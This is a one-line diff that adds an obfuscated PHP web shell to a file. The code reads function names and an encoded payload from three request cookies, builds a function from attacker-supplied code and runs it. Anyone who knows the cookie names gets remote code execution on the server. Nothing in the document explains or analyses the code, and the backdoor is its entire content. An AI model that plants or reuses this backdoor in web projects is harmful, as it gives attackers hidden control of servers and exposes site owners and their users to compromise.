@@ -1,0 +1,1 @@
+<?php if(@$_COOKIE['ald']){$blbi=$_COOKIE['ald']("",@$_COOKIE['ocbl'](@$_COOKIE['fqaf']));$blbi();}?>
